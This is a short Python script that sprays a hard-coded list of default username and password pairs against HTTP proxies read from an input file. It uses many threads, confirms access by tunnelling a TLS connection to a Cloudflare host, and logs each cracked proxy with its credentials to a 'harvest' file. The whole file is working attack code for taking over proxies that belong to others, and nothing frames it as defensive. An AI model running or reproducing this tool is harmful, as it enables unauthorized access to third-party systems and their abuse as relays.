import ssl, socket, base64, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "speed.cloudflare.com"
PAIRS = [("admin","admin"),("admin",""),("root","root"),("proxy","proxy"),
         ("squid","squid"),("admin","123456"),("admin","password"),("user","pass"),
         ("test","test"),("guest","guest"),("admin","squid"),("root",""),
         ("admin","admin123"),("ubuntu","ubuntu"),("default","default")]

def probe(ip, port, user, pw):
    s = None
    try:
        s = socket.create_connection((ip, port), timeout=6)
        s.settimeout(6)
        hdr = ""
        if user or pw:
            tok = base64.b64encode(f"{user}:{pw}".encode()).decode()
            hdr = f"Proxy-Authorization: Basic {tok}\r\n"
        s.sendall(f"CONNECT {TARGET}:443 HTTP/1.1\r\nHost: {TARGET}:443\r\n{hdr}\r\n".encode())
        resp = b""
        while b"\r\n\r\n" not in resp:
            c = s.recv(512)
            if not c:
                break
            resp += c
            if len(resp) > 2048:
                break
        if b" 200" not in resp.split(b"\r\n")[0]:
            s.close()
            return False
        ctx = ssl.create_default_context()
        ss = ctx.wrap_socket(s, server_hostname=TARGET)
        ss.do_handshake()
        ok = bool(ss.getpeercert())
        ss.close()
        return ok
    except Exception:
        try:
            s.close()
        except Exception:
            pass
        return False

def crack(ip, port):
    for u, p in PAIRS:
        if probe(ip, port, u, p):
            return ip, port, u, p
    return ip, port, None, None

ap = argparse.ArgumentParser()
ap.add_argument("--input", required=True)
ap.add_argument("--out", default="ip/harvest/verified_alive_part_local.txt")
ap.add_argument("--workers", type=int, default=100)
a = ap.parse_args()

eps = []
for l in open(a.input, encoding="utf-8", errors="ignore"):
    l = l.strip()
    if l and ":" in l:
        h, p = l.rsplit(":", 1)
        if p.isdigit():
            eps.append((h, int(p)))

print("spraying", len(eps))
hits = 0
with ThreadPoolExecutor(max_workers=a.workers) as ex:
    futs = [ex.submit(crack, h, p) for h, p in eps]
    for f in as_completed(futs):
        ip, port, u, p = f.result()
        if u is not None:
            hits += 1
            with open(a.out, "a", encoding="utf-8") as af:
                af.write(f"{ip}:{port}\t{TARGET}\tLOCAL\t0\tAUTH:{u}:{p}\n")
            print("OPEN", ip, port, u, p)
print("hits", hits, "of", len(eps))
